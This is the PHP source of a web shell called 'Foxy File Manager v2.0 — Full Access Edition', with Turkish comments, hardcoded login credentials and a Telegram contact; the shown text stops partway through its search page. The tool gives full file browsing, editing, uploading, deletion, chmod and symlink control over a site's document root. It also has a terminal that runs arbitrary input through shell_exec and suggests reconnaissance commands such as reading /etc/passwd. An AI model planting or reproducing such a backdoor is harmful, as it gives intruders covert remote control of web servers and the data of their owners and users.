<?php

session_start();
error_reporting(0);

// ═══════════════════════════════════════════
//  YAPILANDIRMA
// ═══════════════════════════════════════════
$giris_id   = 'foxy';
$giris_pass = 'boss112';

// Foxy.php nerede olursa olsun açılış her zaman public_html'den
$calisma_klasoru = '';
if (isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT'] !== '') {
    $calisma_klasoru = $_SERVER['DOCUMENT_ROOT'];
} else {
    $d = str_replace('\\', '/', __DIR__);
    if (basename($d) === 'public_html' && @is_dir($d)) {
        $calisma_klasoru = $d;
    } else {
        $parent = $d;
        for ($i = 0; $i < 20; $i++) {
            $candidate = rtrim($parent, '/') . '/public_html';
            if (@is_dir($candidate)) { $calisma_klasoru = $candidate; break; }
            if (basename($parent) === 'public_html') { $calisma_klasoru = $parent; break; }
            $next = dirname($parent);
            if ($next === $parent) break;
            $parent = $next;
        }
        if ($calisma_klasoru === '') $calisma_klasoru = __DIR__;
    }
}
$calisma_klasoru = str_replace('\\', '/', rtrim($calisma_klasoru, '/'));

$max_duzenleme_boyutu = 10 * 1024 * 1024;  // 10 MB
$max_upload_boyutu    = 256 * 1024 * 1024;  // 256 MB

// ═══════════════════════════════════════════
//  GİRİŞ SİSTEMİ
// ═══════════════════════════════════════════
if (!isset($_SESSION['fm_giris']) || $_SESSION['fm_giris'] !== true) {
    $hata = '';
    if (isset($_POST['id'], $_POST['pass'])) {
        if ($_POST['id'] === $giris_id && $_POST['pass'] === $giris_pass) {
            $_SESSION['fm_giris'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        }
        $hata = 'Yanlış ID veya şifre.';
    }
    ?>
    <!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Giriş - Foxy File Manager</title>
    <style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0e14;color:#e2e8f0;min-height:100vh;display:flex;align-items:center;justify-content:center}.kutu{background:linear-gradient(135deg,#0d3d3d,#0d4f4f);padding:2.5rem;border-radius:16px;max-width:360px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.5)}h1{margin:0 0 .5rem;font-size:1.4rem;color:#14b8a6}p.sub{color:#94a3b8;font-size:.8rem;margin-bottom:1.5rem}input[type=text],input[type=password]{width:100%;padding:14px;border:1px solid #14b8a6;border-radius:10px;background:#0a0e14;color:#fff;font-size:1rem;margin-bottom:1rem;outline:none;transition:border .2s}input:focus{border-color:#2dd4bf}button{width:100%;padding:14px;background:linear-gradient(135deg,#14b8a6,#0d9488);color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:1rem;transition:transform .1s}button:hover{transform:translateY(-1px)}button:active{transform:translateY(0)}.hata{color:#f87171;font-size:.875rem;margin-bottom:.75rem;padding:.5rem;background:#451a1a;border-radius:8px;text-align:center}</style></head><body>
    <div class="kutu"><h1>🦊 Foxy File Manager</h1><p class="sub">v2.0 — Full Access Edition</p>
    <?php if ($hata) echo '<p class="hata">'.$hata.'</p>'; ?>
    <form method="post"><input type="text" name="id" placeholder="Kullanıcı ID" required autofocus><input type="password" name="pass" placeholder="Şifre" required><button type="submit">Giriş Yap</button></form><p style="margin-top:1.5rem;text-align:center;font-size:.8rem;color:#64748b">Telegram: <a href="https://t.me/foxyabi" target="_blank" style="color:#14b8a6;text-decoration:none;font-weight:600">@foxyabi</a></p></div></body></html>
    <?php exit;
}

// Çıkış
if (isset($_GET['cikis'])) {
    $_SESSION = [];
    session_destroy();
    header('Location: ' . strtok($_SERVER['PHP_SELF'], '?'));
    exit;
}

// ═══════════════════════════════════════════
//  YARDIMCI FONKSİYONLAR
// ═══════════════════════════════════════════
function guvenli_path($base, $path) {
    $path = str_replace(["\0", '\\'], ['', '/'], $path);
    $path = trim($path, " \t\n\r/");
    $base = str_replace('\\', '/', rtrim($base, '/'));
    if ($path === '' || $path === '.') {
        $resolved = realpath($base);
        return $resolved !== false ? $resolved : $base;
    }
    $parts = array_filter(explode('/', $path), function ($x) { return $x !== '.' && $x !== ''; });
    $resolved = [];
    foreach ($parts as $seg) {
        if ($seg === '..') {
            if (!empty($resolved)) array_pop($resolved);
        } else {
            $resolved[] = $seg;
        }
    }
    $relative = implode('/', $resolved);
    $full = $base . '/' . $relative;
    $baseReal = realpath($base);
    if ($baseReal !== false) $base = $baseReal;
    if ($relative === '') return $base;
    $realFull = realpath($full);
    if ($realFull !== false) {
        $baseForCmp = realpath($base) ?: $base;
        if (strpos($realFull, $baseForCmp) === 0) return $realFull;
    }
    return $full;
}

function format_boyut($b) {
    if ($b >= 1073741824) return number_format($b / 1073741824, 2) . ' GB';
    if ($b >= 1048576)    return number_format($b / 1048576, 1) . ' MB';
    if ($b >= 1024)       return number_format($b / 1024, 1) . ' KB';
    return $b . ' B';
}

function dosya_ikon($isim, $klasor = false) {
    if ($klasor) return '📂';
    $ext = strtolower(pathinfo($isim, PATHINFO_EXTENSION));
    $map = [
        'php'=>'🔶','html'=>'🌐','htm'=>'🌐','css'=>'🎨','js'=>'⚡','ts'=>'💠',
        'json'=>'📋','xml'=>'📋','yaml'=>'📋','yml'=>'📋','toml'=>'📋','ini'=>'⚙️','conf'=>'⚙️','cfg'=>'⚙️',
        'txt'=>'📃','md'=>'📝','log'=>'📜','csv'=>'📊',
        'png'=>'🖼️','jpg'=>'🖼️','jpeg'=>'🖼️','gif'=>'🖼️','svg'=>'🖼️','webp'=>'🖼️','ico'=>'🖼️','bmp'=>'🖼️',
        'zip'=>'📦','tar'=>'📦','gz'=>'📦','bz2'=>'📦','rar'=>'📦','7z'=>'📦',
        'pdf'=>'📕','doc'=>'📘','docx'=>'📘','xls'=>'📗','xlsx'=>'📗','ppt'=>'📙',
        'mp3'=>'🎵','wav'=>'🎵','flac'=>'🎵','ogg'=>'🎵',
        'mp4'=>'🎬','avi'=>'🎬','mkv'=>'🎬','mov'=>'🎬','webm'=>'🎬',
        'py'=>'🐍','rb'=>'💎','java'=>'☕','c'=>'⚙️','cpp'=>'⚙️','h'=>'⚙️','go'=>'🔷','rs'=>'🦀',
        'sh'=>'🖥️','bash'=>'🖥️','bat'=>'🖥️','ps1'=>'🖥️',
        'sql'=>'🗃️','db'=>'🗃️','sqlite'=>'🗃️',
        'key'=>'🔑','pem'=>'🔑','crt'=>'🔑','pub'=>'🔑',
        'htaccess'=>'🔒','htpasswd'=>'🔒','env'=>'🔒',
    ];
    return $map[$ext] ?? '📄';
}

function perm_str($p) {
    $s = '';
    $s .= (($p & 0x0100) ? 'r' : '-');
    $s .= (($p & 0x0080) ? 'w' : '-');
    $s .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
    $s .= (($p & 0x0020) ? 'r' : '-');
    $s .= (($p & 0x0010) ? 'w' : '-');
    $s .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
    $s .= (($p & 0x0004) ? 'r' : '-');
    $s .= (($p & 0x0002) ? 'w' : '-');
    $s .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
    return $s;
}

function recursive_copy($src, $dst) {
    if (is_dir($src)) {
        @mkdir($dst, 0755, true);
        $items = @scandir($src);
        if ($items) foreach ($items as $f) {
            if ($f === '.' || $f === '..') continue;
            recursive_copy($src . '/' . $f, $dst . '/' . $f);
        }
    } else {
        @copy($src, $dst);
    }
}

function recursive_delete($path) {
    if (is_dir($path) && !is_link($path)) {
        $items = @scandir($path);
        if ($items) foreach ($items as $f) {
            if ($f === '.' || $f === '..') continue;
            recursive_delete($path . '/' . $f);
        }
        @rmdir($path);
    } else {
        @unlink($path);
    }
}

function arama_yap($dir, $query, $limit = 200) {
    $sonuc = [];
    $stack = [$dir];
    $query_lower = mb_strtolower($query);
    while (!empty($stack) && count($sonuc) < $limit) {
        $cur = array_pop($stack);
        $items = @scandir($cur);
        if (!$items) continue;
        foreach ($items as $f) {
            if ($f === '.' || $f === '..') continue;
            $full = $cur . '/' . $f;
            if (mb_strpos(mb_strtolower($f), $query_lower) !== false) {
                $sonuc[] = $full;
                if (count($sonuc) >= $limit) break;
            }
            if (is_dir($full) && !is_link($full)) {
                $stack[] = $full;
            }
        }
    }
    return $sonuc;
}

function zip_klasor($source, $destination) {
    if (!class_exists('ZipArchive')) return false;
    $zip = new ZipArchive();
    if ($zip->open($destination, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) return false;
    $source = realpath($source);
    if (is_dir($source)) {
        $iter = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iter as $item) {
            $rel = substr($item->getPathname(), strlen($source) + 1);
            if ($item->isDir()) {
                $zip->addEmptyDir($rel);
            } else {
                $zip->addFile($item->getPathname(), $rel);
            }
        }
    } else {
        $zip->addFile($source, basename($source));
    }
    return $zip->close();
}

function zip_cikar($zip_path, $destination) {
    if (!class_exists('ZipArchive')) return false;
    $zip = new ZipArchive();
    if ($zip->open($zip_path) !== true) return false;
    $zip->extractTo($destination);
    return $zip->close();
}

function dosya_sahip($path) {
    if (!function_exists('posix_getpwuid')) return ['user' => '-', 'group' => '-'];
    $stat = @stat($path);
    if (!$stat) return ['user' => '-', 'group' => '-'];
    $u = @posix_getpwuid($stat['uid']);
    $g = @posix_getgrgid($stat['gid']);
    return [
        'user'  => $u ? $u['name'] : $stat['uid'],
        'group' => $g ? $g['name'] : $stat['gid'],
    ];
}

function resim_mi($isim) {
    $ext = strtolower(pathinfo($isim, PATHINFO_EXTENSION));
    return in_array($ext, ['png','jpg','jpeg','gif','svg','webp','bmp','ico']);
}

function duzenlenebilir_mi($isim) {
    $ext = strtolower(pathinfo($isim, PATHINFO_EXTENSION));
    $ok = ['php','html','htm','css','js','ts','json','xml','yaml','yml','toml','ini','conf','cfg',
           'txt','md','log','csv','sh','bash','bat','ps1','py','rb','java','c','cpp','h','go','rs',
           'sql','htaccess','htpasswd','env','tpl','twig','vue','jsx','tsx','scss','sass','less',
           'svg','crt','pem','pub','key','gitignore','dockerignore','editorconfig','makefile'];
    $name_lower = strtolower(basename($isim));
    if (in_array($name_lower, ['makefile','dockerfile','vagrantfile','gemfile','rakefile','procfile','.gitignore','.env','.htaccess'])) return true;
    return in_array($ext, $ok) || $ext === '';
}

// ═══════════════════════════════════════════
//  TEMEL DEĞİŞKENLER
// ═══════════════════════════════════════════
$base = realpath($calisma_klasoru);
if ($base === false) $base = $calisma_klasoru;
$base = str_replace('\\', '/', rtrim($base, '/'));
$mesaj = '';
$mesaj_tip = 'ok';

// ═══════════════════════════════════════════
//  İNDİRME
// ═══════════════════════════════════════════
if (isset($_GET['indir'])) {
    $hedef = guvenli_path($base, $_GET['indir']);
    if (is_file($hedef)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($hedef) . '"');
        header('Content-Length: ' . filesize($hedef));
        header('Cache-Control: no-cache');
        readfile($hedef);
        exit;
    }
}

// Toplu indirme (zip olarak)
if (isset($_POST['toplu_indir']) && !empty($_POST['secili'])) {
    $p = $_POST['p'] ?? '';
    $tmp = tempnam(sys_get_temp_dir(), 'foxy_');
    $zip = new ZipArchive();
    if ($zip->open($tmp, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
        foreach ($_POST['secili'] as $rel) {
            $full = guvenli_path($base, $rel);
            if (is_file($full)) {
                $zip->addFile($full, basename($full));
            } elseif (is_dir($full)) {
                $dirName = basename($full);
                $iter = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($full, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                foreach ($iter as $item) {
                    $relPath = $dirName . '/' . substr($item->getPathname(), strlen($full) + 1);
                    if ($item->isDir()) $zip->addEmptyDir($relPath);
                    else $zip->addFile($item->getPathname(), $relPath);
                }
            }
        }
        $zip->close();
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="foxy_download_' . date('Ymd_His') . '.zip"');
        header('Content-Length: ' . filesize($tmp));
        readfile($tmp);
        @unlink($tmp);
        exit;
    }
}

// ═══════════════════════════════════════════
//  POST İŞLEMLERİ
// ═══════════════════════════════════════════
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['toplu_indir'])) {
    $p = $_POST['p'] ?? '';

    // --- Terminal komutu çalıştır ---
    if (isset($_POST['komut_calistir'])) {
        // Terminal sayfasında kalacak, redirect yok
    }
    // --- Yeni klasör ---
    elseif (isset($_POST['yeni_klasor']) && trim($_POST['klasor_adi'] ?? '') !== '') {
        $adi = str_replace(["\0", '/', '\\', '..'], '', trim($_POST['klasor_adi']));
        if ($adi === '' || $adi === '.') { $mesaj = 'Geçersiz klasör adı.'; $mesaj_tip = 'hata'; }
        else {
            $hedef_dir = guvenli_path($base, $p);
            $hedef = $hedef_dir . '/' . $adi;
            $baseSlash = $base . '/';
            $altinda = ($hedef === $base || strpos($hedef, $baseSlash) === 0);
            if (!$altinda) { $mesaj = 'Yol public_html dışına çıkamaz.'; $mesaj_tip = 'hata'; }
            elseif (file_exists($hedef)) { $mesaj = 'Bu isimde dosya/klasör zaten var.'; $mesaj_tip = 'hata'; }
            else {
                if (@mkdir($hedef, 0755, true)) $mesaj = 'Klasör oluşturuldu: ' . $adi;
                else { $mesaj = 'Klasör oluşturulamadı. Klasör yazılabilir mi kontrol edin.'; $mesaj_tip = 'hata'; }
            }
        }
    }
    // --- Yeni dosya ---
    elseif (isset($_POST['yeni_dosya']) && trim($_POST['dosya_adi'] ?? '') !== '') {
        $adi = str_replace(["\0", '/', '\\', '..'], '', trim($_POST['dosya_adi']));
        if ($adi === '' || $adi === '.') { $mesaj = 'Geçersiz dosya adı.'; $mesaj_tip = 'hata'; }
        else {
            $hedef_dir = guvenli_path($base, $p);
            $hedef = $hedef_dir . '/' . $adi;
            $baseSlash = $base . '/';
            $altinda = ($hedef === $base || strpos($hedef, $baseSlash) === 0);
            if (!$altinda) { $mesaj = 'Yol public_html dışına çıkamaz.'; $mesaj_tip = 'hata'; }
            elseif (file_exists($hedef)) { $mesaj = 'Bu isimde dosya/klasör zaten var.'; $mesaj_tip = 'hata'; }
            else {
                if (!is_dir($hedef_dir)) @mkdir($hedef_dir, 0755, true);
                $ok = @file_put_contents($hedef, '') !== false;
                if (!$ok) $ok = (@touch($hedef) && @file_put_contents($hedef, '') !== false);
                if ($ok) $mesaj = 'Dosya oluşturuldu: ' . $adi;
                else { $mesaj = 'Dosya oluşturulamadı. Klasör yazılabilir mi kontrol edin.'; $mesaj_tip = 'hata'; }
            }
        }
    }
    // --- Dosya düzenleme kaydet ---
    elseif (isset($_POST['kaydet_icerik'], $_POST['dosya_yolu'])) {
        $hedef = guvenli_path($base, $_POST['dosya_yolu']);
        $baseSlash = $base . '/';
        $altinda = ($hedef === $base || strpos($hedef, $baseSlash) === 0);
        if (!$altinda) { $mesaj = 'Dosya public_html dışında.'; $mesaj_tip = 'hata'; }
        elseif (is_file($hedef)) {
            $icerik = $_POST['icerik'] ?? '';
            $ok = @file_put_contents($hedef, $icerik) !== false;
            if (!$ok) $ok = (@touch($hedef) && @file_put_contents($hedef, $icerik) !== false);
            if ($ok) $mesaj = 'Dosya kaydedildi.';
            else { $mesaj = 'Kayıt hatası. Dosya yazılabilir mi kontrol edin.'; $mesaj_tip = 'hata'; }
        } else { $mesaj = 'Dosya bulunamadı.'; $mesaj_tip = 'hata'; }
    }
    // --- Tekli silme ---
    elseif (isset($_POST['sil_yolu'])) {
        $hedef = guvenli_path($base, $_POST['sil_yolu']);
        if (file_exists($hedef) && $hedef !== $base) {
            recursive_delete($hedef);
            $mesaj = file_exists($hedef) ? 'Silinemedi. İzin hatası.' : 'Silindi.';
            $mesaj_tip = file_exists($hedef) ? 'hata' : 'ok';
        } else { $mesaj = 'Silinemez veya bulunamadı.'; $mesaj_tip = 'hata'; }
    }
    // --- Toplu silme ---
    elseif (isset($_POST['toplu_sil']) && !empty($_POST['secili'])) {
        $silinen = 0;
        foreach ($_POST['secili'] as $rel) {
            $hedef = guvenli_path($base, $rel);
            if ($hedef !== $base && file_exists($hedef)) {
                recursive_delete($hedef);
                if (!file_exists($hedef)) $silinen++;
            }
        }
        $mesaj = $silinen . ' öğe silindi.';
    }
    // --- Yeniden adlandır ---
    elseif (isset($_POST['yeniden_ad'], $_POST['eski_yol'], $_POST['yeni_ad']) && trim($_POST['yeni_ad']) !== '') {
        $eski = guvenli_path($base, $_POST['eski_yol']);
        $yeni_ad = trim($_POST['yeni_ad']);
        $yeni = dirname($eski) . '/' . $yeni_ad;
        if (file_exists($eski) && $eski !== $base && !file_exists($yeni)) {
            if (@rename($eski, $yeni)) $mesaj = 'Yeniden adlandırıldı.';
            else { $mesaj = 'Yeniden adlandırılamadı.'; $mesaj_tip = 'hata'; }
        } else { $mesaj = 'İşlem yapılamadı.'; $mesaj_tip = 'hata'; }
    }
    // --- Chmod tekli ---
    elseif (isset($_POST['chmod_uygula'], $_POST['chmod_yolu'], $_POST['chmod_deger'])) {
        $hedef = guvenli_path($base, $_POST['chmod_yolu']);
        $mod = octdec(preg_replace('/[^0-7]/', '', $_POST['chmod_deger']));
        if (file_exists($hedef) && @chmod($hedef, $mod))
            $mesaj = 'İzinler güncellendi: ' . decoct($mod);
        else { $mesaj = 'İzin değiştirilemedi.'; $mesaj_tip = 'hata'; }
    }
    // --- Toplu chmod ---
    elseif (isset($_POST['toplu_chmod']) && !empty($_POST['secili']) && !empty($_POST['chmod_deger'])) {
        $mod = octdec(preg_replace('/[^0-7]/', '', $_POST['chmod_deger']));
        $ok = 0;
        foreach ($_POST['secili'] as $rel) {
            $hedef = guvenli_path($base, $rel);
            if (file_exists($hedef) && @chmod($hedef, $mod)) $ok++;
        }
        $mesaj = $ok . ' öğenin izinleri güncellendi.';
    }
    // --- Kopyala (panoya al) ---
    elseif (isset($_POST['kopyala']) && !empty($_POST['secili'])) {
        $_SESSION['pano'] = ['islem' => 'kopyala', 'dosyalar' => $_POST['secili']];
        $mesaj = count($_POST['secili']) . ' öğe panoya kopyalandı.';
    }
    // --- Kes (panoya al) ---
    elseif (isset($_POST['kes']) && !empty($_POST['secili'])) {
        $_SESSION['pano'] = ['islem' => 'kes', 'dosyalar' => $_POST['secili']];
        $mesaj = count($_POST['secili']) . ' öğe kesildi.';
    }
    // --- Yapıştır ---
    elseif (isset($_POST['yapistir']) && !empty($_SESSION['pano'])) {
        $pano = $_SESSION['pano'];
        $hedef_dir = guvenli_path($base, $p);
        $ok = 0;
        foreach ($pano['dosyalar'] as $rel) {
            $kaynak = guvenli_path($base, $rel);
            $ad = basename($kaynak);
            $dest = $hedef_dir . '/' . $ad;
            if (file_exists($dest) && $kaynak !== $dest) {
                $i = 1;
                $ext = pathinfo($ad, PATHINFO_EXTENSION);
                $name = pathinfo($ad, PATHINFO_FILENAME);
                do {
                    $dest = $hedef_dir . '/' . $name . '_kopya' . $i . ($ext ? '.' . $ext : '');
                    $i++;
                } while (file_exists($dest));
            }
            if ($pano['islem'] === 'kopyala') {
                if (is_dir($kaynak)) recursive_copy($kaynak, $dest);
                else @copy($kaynak, $dest);
                $ok++;
            } else {
                if (@rename($kaynak, $dest)) $ok++;
            }
        }
        if ($pano['islem'] === 'kes') unset($_SESSION['pano']);
        $mesaj = $ok . ' öğe yapıştırıldı.';
    }
    // --- Symlink oluştur ---
    elseif (isset($_POST['symlink_olustur'], $_POST['link_hedef'], $_POST['link_adi']) && trim($_POST['link_adi']) !== '') {
        $hedef_path = $_POST['link_hedef'];
        $link = guvenli_path($base, $p) . '/' . trim($_POST['link_adi']);
        if (@symlink($hedef_path, $link)) $mesaj = 'Sembolik link oluşturuldu.';
        else { $mesaj = 'Symlink oluşturulamadı.'; $mesaj_tip = 'hata'; }
    }
    // --- Zip oluştur ---
    elseif (isset($_POST['zip_olustur']) && !empty($_POST['secili'])) {
        $hedef_dir = guvenli_path($base, $p);
        $zip_adi = 'arsiv_' . date('Ymd_His') . '.zip';
        $zip_path = $hedef_dir . '/' . $zip_adi;
        $zip = new ZipArchive();
        if ($zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
            foreach ($_POST['secili'] as $rel) {
                $full = guvenli_path($base, $rel);
                $ad = basename($full);
                if (is_file($full)) {
                    $zip->addFile($full, $ad);
                } elseif (is_dir($full)) {
                    $iter = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($full, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::SELF_FIRST
                    );
                    foreach ($iter as $item) {
                        $relPath = $ad . '/' . substr($item->getPathname(), strlen($full) + 1);
                        if ($item->isDir()) $zip->addEmptyDir($relPath);
                        else $zip->addFile($item->getPathname(), $relPath);
                    }
                }
            }
            $zip->close();
            $mesaj = 'Arşiv oluşturuldu: ' . $zip_adi;
        } else { $mesaj = 'Zip oluşturulamadı.'; $mesaj_tip = 'hata'; }
    }
    // --- Zip çıkart ---
    elseif (isset($_POST['zip_cikar'], $_POST['zip_yolu'])) {
        $zip_full = guvenli_path($base, $_POST['zip_yolu']);
        $cikar_dir = dirname($zip_full) . '/' . pathinfo($zip_full, PATHINFO_FILENAME);
        @mkdir($cikar_dir, 0755, true);
        if (zip_cikar($zip_full, $cikar_dir)) $mesaj = 'Arşiv çıkartıldı: ' . basename($cikar_dir);
        else { $mesaj = 'Arşiv çıkartılamadı.'; $mesaj_tip = 'hata'; }
    }
    // --- Dosya yükleme ---
    elseif (!empty($_FILES['yukle']['name'][0])) {
        $hedef_dir = guvenli_path($base, $p);
        $yuklenen = 0; $hatali = 0;
        foreach ($_FILES['yukle']['name'] as $i => $name) {
            if ($_FILES['yukle']['error'][$i] === UPLOAD_ERR_OK) {
                $dest = $hedef_dir . '/' . basename($name);
                if (@move_uploaded_file($_FILES['yukle']['tmp_name'][$i], $dest)) $yuklenen++;
                else $hatali++;
            } else $hatali++;
        }
        $mesaj = $yuklenen . ' dosya yüklendi.';
        if ($hatali) { $mesaj .= ' ' . $hatali . ' hata.'; $mesaj_tip = $yuklenen ? 'ok' : 'hata'; }
    }

    // Terminal komutu hariç POST sonrası redirect
    if (!isset($_POST['komut_calistir'])) {
        header('Location: ' . $_SERVER['PHP_SELF'] . '?p=' . urlencode($p) . '&m=' . urlencode($mesaj) . '&t=' . ($mesaj_tip === 'hata' ? '0' : '1'));
        exit;
    }
}

// ═══════════════════════════════════════════
//  SAYFA DEĞİŞKENLERİ
// ═══════════════════════════════════════════
$goster_p = $_GET['p'] ?? '';
if (isset($_GET['m'])) {
    $mesaj = $_GET['m'];
    $mesaj_tip = (isset($_GET['t']) && $_GET['t'] === '0') ? 'hata' : 'ok';
}
$mevcut = guvenli_path($base, $goster_p);
if (!is_dir($mevcut)) $mevcut = $base;
$base_len = strlen(rtrim($base, '/'));
$relative_mevcut = $base === '/'
    ? ltrim($mevcut, '/')
    : trim(str_replace('\\', '/', substr($mevcut, $base_len)), '/');

// Pano durumu
$pano_bilgi = '';
if (!empty($_SESSION['pano'])) {
    $pano = $_SESSION['pano'];
    $pano_bilgi = count($pano['dosyalar']) . ' öğe ' . ($pano['islem'] === 'kopyala' ? 'kopyalandı' : 'kesildi');
}

// ═══════════════════════════════════════════
//  TERMİNAL SAYFASI
// ═══════════════════════════════════════════
if (isset($_GET['terminal'])) {
    $term_dir = $mevcut;
    $komut = '';
    $cikti = '';
    if (isset($_POST['komut_calistir']) && trim($_POST['komut'] ?? '') !== '') {
        $komut = trim($_POST['komut']);
        $term_dir = $_POST['cwd'] ?? $mevcut;
        if (!is_dir($term_dir)) $term_dir = $mevcut;
        $full_cmd = 'cd ' . escapeshellarg($term_dir) . ' && ' . $komut . ' 2>&1';
        $cikti = @shell_exec($full_cmd);
        if ($cikti === null) $cikti = '[Komut çalıştırılamadı veya çıktı yok]';
    }
    ?>
    <!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Terminal - Foxy</title>
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0e14;color:#e2e8f0;min-height:100vh}
        .topbar{background:linear-gradient(135deg,#0d3d3d,#0d4f4f);padding:.75rem 1rem;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:.5rem}
        .topbar h1{font-size:1.1rem;color:#fff}.topbar a{color:#2dd4bf;text-decoration:none;font-size:.875rem}
        .terminal-wrap{padding:1rem;max-width:1200px;margin:0 auto}
        .terminal-box{background:#1a2332;border:1px solid #334155;border-radius:12px;overflow:hidden}
        .terminal-header{background:#0d4f4f;padding:.75rem 1rem;color:#fff;font-size:.875rem;display:flex;justify-content:space-between;align-items:center}
        .terminal-output{padding:1rem;min-height:300px;max-height:60vh;overflow-y:auto;font-family:'Cascadia Code','Fira Code',monospace;font-size:13px;white-space:pre-wrap;word-break:break-all;color:#a0f0a0;background:#0a0e14}
        .terminal-input{display:flex;border-top:1px solid #334155}
        .terminal-input span{padding:.75rem;color:#14b8a6;font-family:monospace;background:#111827}
        .terminal-input input{flex:1;padding:.75rem;background:#111827;border:none;color:#fff;font-family:monospace;font-size:14px;outline:none}
        .terminal-input button{padding:.75rem 1.5rem;background:#14b8a6;color:#0a0e14;border:none;font-weight:700;cursor:pointer}
        .cwd-bar{padding:.5rem 1rem;background:#111827;border-top:1px solid #334155;display:flex;gap:.5rem;align-items:center}
        .cwd-bar label{color:#64748b;font-size:.8rem}.cwd-bar input{flex:1;padding:.4rem .75rem;background:#0a0e14;border:1px solid #334155;border-radius:6px;color:#94a3b8;font-size:.8rem}
        .info{padding:1rem;color:#64748b;font-size:.8rem}
        .btn{padding:.5rem 1rem;background:#0d4f4f;color:#fff;border:none;border-radius:6px;cursor:pointer;text-decoration:none;font-size:.875rem;display:inline-flex;align-items:center;gap:.35rem}
        .btn:hover{background:#14b8a6;color:#0a0e14}
    </style></head><body>
    <div class="topbar"><h1>🖥️ Foxy Terminal</h1><div><a href="?p=<?php echo urlencode($relative_mevcut); ?>" class="btn">📁 Dosya Yöneticisi</a> <a href="?cikis=1" class="btn">Çıkış</a></div></div>
    <div class="terminal-wrap">
        <div class="terminal-box">
            <div class="terminal-header"><span>Terminal</span><span><?php echo htmlspecialchars(php_uname('n')); ?></span></div>
            <div class="terminal-output" id="output"><?php
                if ($komut) {
                    echo '<span style="color:#14b8a6">$ ' . htmlspecialchars($komut) . '</span>' . "\n";
                    echo htmlspecialchars($cikti);
                } else {
                    echo '<span style="color:#64748b">Komut girin ve Enter\'a basın...</span>';
                }
            ?></div>
            <form method="post" action="?terminal=1&p=<?php echo urlencode($relative_mevcut); ?>">
                <div class="cwd-bar">
                    <label>Çalışma dizini:</label>
                    <input type="text" name="cwd" value="<?php echo htmlspecialchars($term_dir); ?>">
                </div>
                <div class="terminal-input">
                    <span>$</span>
                    <input type="text" name="komut" placeholder="Komut yazın..." autofocus autocomplete="off" value="">
                    <input type="hidden" name="komut_calistir" value="1">
                    <button type="submit">Çalıştır</button>
                </div>
            </form>
        </div>
        <div class="info">
            ⚡ Hızlı komutlar:
            <code>whoami</code> · <code>pwd</code> · <code>ls -la</code> · <code>df -h</code> · <code>free -m</code> · <code>ps aux</code> · <code>cat /etc/passwd</code> · <code>uname -a</code> · <code>id</code> · <code>netstat -tlnp</code>
        </div>
    </div></body></html>
    <?php exit;
}

// ═══════════════════════════════════════════
//  ARAMA SAYFASI
// ═══════════════════════════════════════════
if (isset($_GET['ara']) && trim($_GET['ara']) !== '') {
    $arama_sorgu = trim($_GET['ara']);
    $arama_sonuc = arama_yap($mevcut, $arama_sorgu, 300);
    ?>
    <!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Arama: <?php echo htmlspecialchars($arama_sorgu); ?> - Foxy</title>
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0e14;color:#e2e8f0;min-height:100vh}
        .topbar{background:linear-gradient(135deg,#0d3d3d,#0d4f4f);padding:.75rem 1rem;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:.5rem}
        .topbar h1{font-size:1.1rem;color:#fff}.topbar a{color:#2dd4bf;text-decoration:none}
        .content{padding:1rem;max-width:1200px;margin:0 auto}
        .btn{padding:.5rem 1rem;background:#0d4f4f;color:#fff;border:none;border-radius:6px;cursor:pointer;text-decoration:none;font-size:.875rem;display:inline-flex;align-items:center;gap:.35rem}
        .btn:hover{background:#14b8a6;color:#0a0e14}
        .search-info{margin:1rem 0;color:#94a3b8;font-size:.9rem}
        table{width:100%;border-collapse:collapse;background:#1a2332;border-radius:12px;overflow:hidden;margin-top:1rem}
        th,td{padding:.6rem 1rem;text-align:left;border-bottom:1px solid #1e293b}
        th{background:#0d4f4f;color:#fff;font-size:.8rem;font-weight:600}
        tr:hover{background:#1e293b}
        td a{color:#e2e8f0;text-decoration:none;display:flex;align-items:center;gap:.5rem}
        td a:hover{color:#14b8a6}
        .icon{font-size:1.1rem}
        .path{color:#64748b;font-size:.8rem}
    </style></head><body>
    <div class="topbar"><h1>🔍 Arama Sonuçları</h1><a href="?p=<?php echo urlencode($relative_mevcut); ?>" class="btn">📁 Geri Dön</a></div>
    <div class="content">
